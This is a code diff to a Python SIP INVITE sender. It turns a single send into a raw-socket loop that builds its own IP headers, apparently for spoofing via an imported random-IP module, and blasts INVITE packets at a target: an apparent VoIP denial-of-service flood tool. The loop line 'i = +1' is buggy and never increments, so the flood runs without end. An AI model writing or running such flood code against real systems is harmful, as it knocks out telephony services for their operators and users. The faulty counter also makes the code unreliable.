@@ -1,4 +1,6 @@
+import socket
 import generatePacket
+import randomIP
 
 
 class SendInvite:
@@ -13,4 +15,10 @@ class SendInvite:
         message += "Call-ID: a84b4c76e66710@pc33.atlanta.com\n"
         message += "CSeq: 314159 INVITE\n\n"
         gp = generatePacket.GeneratePacket()
-        gp.generate(target_ip, message)
+        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
+        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        r = randomIP.RandomIP()
+        i = 0
+        while i < 100000:
+            s.sendto(gp.generate(message, target_ip), (target_ip, 0))
+            i = +1
